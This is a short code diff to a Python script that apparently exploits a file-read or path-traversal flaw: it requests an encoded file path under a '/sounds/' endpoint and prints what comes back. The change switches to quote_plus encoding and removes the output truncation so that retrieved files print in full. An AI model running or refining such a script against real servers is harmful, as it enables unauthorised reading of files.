@@ -5,7 +5,7 @@ import requests
 import urllib.parse
 
 def retrieve_file(url, file_path):
-    encoded_path = urllib.parse.quote(file_path)
+    encoded_path = urllib.parse.quote_plus(file_path)
     full_url = f"{url}/sounds/{encoded_path}"
     
     headers = {
@@ -36,7 +36,7 @@ def main():
     if status_code == 200:
         print("[+] File retrieved successfully!")
         print("[*] File contents:")
-        print(response_text[:500] + "..." if len(response_text) > 500 else response_text)
+        print(response_text)
     else:
         print("[-] File retrieval failed.")
         print("[*] Response:")
